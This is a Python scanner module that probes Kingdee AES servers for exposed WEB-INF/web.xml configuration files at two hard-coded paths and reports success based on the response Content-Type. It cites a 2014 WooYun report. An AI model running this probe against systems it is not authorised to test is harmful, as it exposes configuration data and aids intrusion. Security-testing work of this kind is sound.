#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 金蝶AES系统Java web配置文件泄露
referer: http://www.wooyun.org/bugs/wooyun-2014-083323
author: Lucifer
description: 文件/WEB-INF/web.xml泄露。
'''
import sys
import requests
import warnings
sys.path.append('../../') 
from color import *

class kingdee_conf_disclosure:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/portal/WEB-INF/web.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                printGreen("[+]Success:存在金蝶AES系统Java web配置文件泄露漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在kingdee_conf_disclosure漏洞")

            vulnurl = self.url + "/eassso/WEB-INF/web.xml"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                printGreen("[+]Success:存在金蝶AES系统Java web配置文件泄露漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在kingdee_conf_disclosure漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = kingdee_conf_disclosure(sys.argv[1])
    testVuln.run()